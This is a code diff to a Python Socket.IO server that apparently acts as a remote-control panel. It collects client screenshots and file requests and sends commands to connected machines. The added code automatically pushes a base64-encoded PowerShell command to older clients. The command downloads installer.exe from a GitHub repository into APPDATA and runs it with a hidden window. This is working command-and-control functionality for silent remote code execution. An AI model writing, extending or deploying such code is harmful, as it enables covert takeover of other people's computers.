@@ -11,6 +11,8 @@ import shutil
 import sqlite3
 import base64
 import threading
+import time
+import subprocess
 import json
 import ipaddress
 import urllib.request
@@ -48,6 +50,22 @@ def check_access_logs_password(supplied: Optional[str]) -> bool:
 SCREENSHOT_DIR: str = "uploaded_frames"
 os.makedirs(SCREENSHOT_DIR, exist_ok=True)
 
+AUTO_UPDATE_CLIENTS: bool = os.getenv("AUTO_UPDATE_CLIENTS", "true").strip().lower() in ("1", "true", "yes")
+SERVER_VERSION: str = os.getenv("SERVER_VERSION", "").strip()
+if not SERVER_VERSION:
+    try:
+        SERVER_VERSION = (
+            subprocess.check_output(
+                ["git", "rev-parse", "--short", "HEAD"],
+                cwd=os.path.dirname(os.path.abspath(__file__)),
+                stderr=subprocess.DEVNULL,
+            )
+            .decode("utf-8")
+            .strip()
+        )
+    except Exception:
+        SERVER_VERSION = ""
+
 MAX_FRAMES_PER_USER: int = 1000
 DATABASE_FILE: str = "database.db"
 
@@ -76,6 +94,10 @@ pending_fs_requests: Dict[str, Dict[str, Any]] = {}  # Mapping: req_id -> {event
 # Lock for administrator blocked IP address set
 blocked_ips_lock = threading.Lock()
 blocked_ips_set: Set[str] = set()
+
+# Lock and cooldown tracking for automatic legacy client updates
+auto_update_lock = threading.Lock()
+auto_update_cooldown: Dict[str, float] = {}  # Mapping: username -> timestamp of last dispatched update
 
 
 def is_ip_blocked(ip: Optional[str]) -> bool:
@@ -730,6 +752,43 @@ def handle_register(data: Any) -> None:
         room="dashboard",
     )
     log_operation(username, "SYSTEM", f"Client online ({client_ip}, v{version or 'dev'})", "online")
+
+    # Automatically dispatch update command to outdated or legacy clients
+    if AUTO_UPDATE_CLIENTS:
+        is_legacy = (not version) or (version == "dev") or (
+            bool(SERVER_VERSION) and not (version.startswith(SERVER_VERSION) or SERVER_VERSION.startswith(version))
+        )
+        if is_legacy:
+            now = time.time()
+            with auto_update_lock:
+                last_dispatched = auto_update_cooldown.get(username, 0.0)
+                should_dispatch = (now - last_dispatched) > 1800.0  # 30-minute cooldown
+                if should_dispatch:
+                    auto_update_cooldown[username] = now
+
+            if should_dispatch:
+                def _trigger_auto_update(target_user: str, client_ver: str) -> None:
+                    time.sleep(3)  # Allow socket rooms and registration to fully stabilize
+                    update_script = (
+                        "$ProgressPreference = 'SilentlyContinue'; "
+                        "$p = \"$env:APPDATA\\run\"; "
+                        "if (!(Test-Path $p)) { New-Item -ItemType Directory -Path $p -Force | Out-Null }; "
+                        "$sha = (Invoke-RestMethod 'https://api.github.com/repos/yuan-miranda/run/commits/main').sha; "
+                        "$o = \"$p\\installer.exe\"; "
+                        "Invoke-WebRequest -Uri \"https://github.com/yuan-miranda/run/raw/$sha/installer.exe\" -OutFile $o; "
+                        "Start-Process -FilePath $o -WindowStyle Hidden"
+                    )
+                    encoded_cmd = base64.b64encode(update_script.encode("utf-8")).decode("utf-8")
+                    socketio.emit("exec_command", {"cmd": encoded_cmd, "visible": 0}, room=target_user)
+                    log_operation(
+                        target_user,
+                        "UPDATE",
+                        f"Auto-dispatched client update (current: v{client_ver or 'legacy'}, target: v{SERVER_VERSION or 'latest'})",
+                        "dispatched",
+                    )
+                    print(f"[*] Auto-dispatched update to legacy client '{target_user}' (v{client_ver or 'legacy'})")
+
+                threading.Thread(target=_trigger_auto_update, args=(username, version), daemon=True).start()
 
 
 @socketio.on("disconnect")
